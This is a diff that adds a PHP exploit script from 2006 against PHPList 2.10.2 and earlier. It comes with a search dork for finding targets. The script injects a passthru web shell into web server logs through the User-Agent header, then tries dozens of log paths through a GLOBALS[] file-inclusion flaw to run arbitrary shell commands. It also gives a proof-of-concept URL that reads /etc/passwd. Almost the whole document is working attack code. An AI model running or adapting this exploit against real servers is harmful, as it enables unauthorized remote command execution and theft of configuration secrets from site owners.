@@ -1,0 +1,227 @@
+#!/usr/bin/php -q -d short_open_tag=on
+<?
+echo "PHPList <= 2.10.2 GLOBALS[] remote cmmnds xctn \r\n";
+echo "by rgod rgod@autistici.org\r\n";
+echo "site: http://retrogod.altervista.org\r\n\r\n";
+echo "-> this works against register_globals=On \r\n";
+echo "a dork: inurl:\"lists/?p=subscribe\" | inurl:\"lists/index.php?p=subscribe\"\r\n";
+echo " -ubbi phplist\r\n\r\n";
+
+if ($argc<4) {
+echo "Usage: php ".$argv[0]." host path cmd OPTIONS\r\n";
+echo "host:      target server (ip/hostname)\r\n";
+echo "path:      path to PHPList\r\n";
+echo "cmd:       a shell command\r\n";
+echo "Options:\r\n";
+echo "   -p[port]:    specify a port other than 80\r\n";
+echo "   -P[ip:port]: specify a proxy\r\n";
+echo "Examples:\r\n";
+echo "php ".$argv[0]." localhost /lists/ cat ./config/config.php\r\n";
+echo "php ".$argv[0]." localhost /lists/ ls -la -p81\r\n";
+echo "php ".$argv[0]." localhost / ls -la -P1.1.1.1:80\r\n";
+die;
+}
+
+/*
+software site: http://tincan.co.uk/phplist
+
+description: PHPlist is a double opt-in newsletter manager. It is written in PHP
+and uses an SQL database for storing the information
+
+vulnerability:
+vulnerable code in lists/index.php at lines 18-28:
+...
+if (isset($GLOBALS["developer_email"])) {
+  error_reporting(E_ALL);
+} else {
+  error_reporting(0);
+}
+require_once dirname(__FILE__) .'/admin/commonlib/lib/magic_quotes.php';
+
+require_once dirname(__FILE__).'/admin/init.php';
+require_once dirname(__FILE__).'/admin/'.$GLOBALS["database_module"];
+require_once dirname(__FILE__)."/texts/english.inc";
+include_once dirname(__FILE__)."/texts/".$GLOBALS["language_module"];
+...
+
+a lack in the code:
+$database_module and $language_module vars are properly initialized in
+config/config.php, but... when code would use them to include files
+they are called with their GLOBALS corresponding vars.
+So, if register_globals = On in php.ini you can include arbitrary file from
+local resources, poc:
+
+http://[target]/[path_to_phplist]/lists/index.php?GLOBALS[developer_email]=1&GLOBALS[database_module]=../../../../../../etc/passwd
+
+also you can turn on all php messages and warnings until language_module is
+called, as you can see.
+This tool inject some code in log files and try to include them to
+launch commands on target machine
+                                                                              */
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+  #debug
+  #echo "\r\n".$html;
+}
+function make_seed()
+{
+   list($usec, $sec) = explode(' ', microtime());
+   return (float) $sec + ((float) $usec * 100000);
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$cmd="";$port=80;$proxy="";
+
+for ($i=3; $i<=$argc-1; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if (($temp<>"-p") and ($temp<>"-P"))
+{$cmd.=" ".$argv[$i];}
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+}
+$cmd=urlencode($cmd);
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+echo "[1] Injecting some code in log files ...\r\n";
+$CODE="<?php if(get_magic_quotes_gpc()){\$_GET[cmd]=stripslashes(\$_GET[cmd]);}echo 56789;passthru(\$_GET[cmd]);die;?>";
+$packet="GET ".$p.$CODE." HTTP/1.0\r\n";
+$packet.="User-Agent: ".$CODE." Googlebot/2.1\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: close\r\n\r\n";
+sendpacketii($packet);
+sleep(1);
+
+$paths=array(
+"../../../../../../../../../../var/log/httpd/access_log",
+"../../../../../../../../../../var/log/httpd/error_log",
+"../apache/logs/error.log",
+"../apache/logs/access.log",
+"../../apache/logs/error.log",
+"../../apache/logs/access.log",
+"../../../apache/logs/error.log",
+"../../../apache/logs/access.log",
+"../../../../apache/logs/error.log",
+"../../../../apache/logs/access.log",
+"../../../../../apache/logs/error.log",
+"../../../../../apache/logs/access.log",
+"../../../../../../apache/logs/error.log",
+"../../../../../../apache/logs/access.log",
+"../logs/error.log",
+"../logs/access.log",
+"../../logs/error.log",
+"../../logs/access.log",
+"../../../logs/error.log",
+"../../../logs/access.log",
+"../../../../logs/error.log",
+"../../../../logs/access.log",
+"../../../../../logs/error.log",
+"../../../../../logs/access.log",
+"../../../../../../logs/error.log",
+"../../../../../../logs/access.log",
+"../../../../../../../../../../etc/httpd/logs/acces_log",
+"../../../../../../../../../../etc/httpd/logs/acces.log",
+"../../../../../../../../../../etc/httpd/logs/error_log",
+"../../../../../../../../../../etc/httpd/logs/error.log",
+"../../../../../../../../../../var/www/logs/access_log",
+"../../../../../../../../../../var/www/logs/access.log",
+"../../../../../../../../../../usr/local/apache/logs/access_log",
+"../../../../../../../../../../usr/local/apache/logs/access.log",
+"../../../../../../../../../../var/log/apache/access_log",
+"../../../../../../../../../../var/log/apache/access.log",
+"../../../../../../../../../../var/log/access_log",
+"../../../../../../../../../../var/www/logs/error_log",
+"../../../../../../../../../../var/www/logs/error.log",
+"../../../../../../../../../../usr/local/apache/logs/error_log",
+"../../../../../../../../../../usr/local/apache/logs/error.log",
+"../../../../../../../../../../var/log/apache/error_log",
+"../../../../../../../../../../var/log/apache/error.log",
+"../../../../../../../../../../var/log/access_log",
+"../../../../../../../../../../var/log/error_log"
+);
+
+for ($i=0; $i<=count($paths)-1; $i++)
+{
+$a=$i+2;
+echo "[".$a."] Trying with: ".$paths[$i]."\r\n";
+$packet ="GET ".$p."index.php?GLOBALS[developer_email]=1&GLOBALS[database_module]=".$paths[$i];
+$packet.="&GLOBALS[language_module]=".$paths[$i]."&cmd=".$cmd." HTTP/1.0\r\n";
+$packet.="User-Agent: Googlebot/2.1\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+if (strstr($html,"56789"))
+{
+ $temp=explode("56789",$html);
+ echo $temp[1];
+ echo "\r\nExploit succeeded...\r\n";
+ die;
+}
+}
+#if you are here...
+echo "Exploit failed...";
+?>
+
+# milw0rm.com [2006-04-10]
